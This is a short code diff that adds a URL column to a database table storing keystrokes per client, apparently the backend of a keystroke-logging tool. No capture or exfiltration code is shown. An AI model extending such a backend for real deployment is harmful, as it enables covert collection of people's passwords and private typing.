@@ -28,6 +28,7 @@ function setupTables() {
             client_id TEXT NOT NULL,
             timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
             keystrokes TEXT NOT NULL,
+            url TEXT NOT NULL,
             FOREIGN KEY (client_id) REFERENCES clients(client_id)
         )
     `
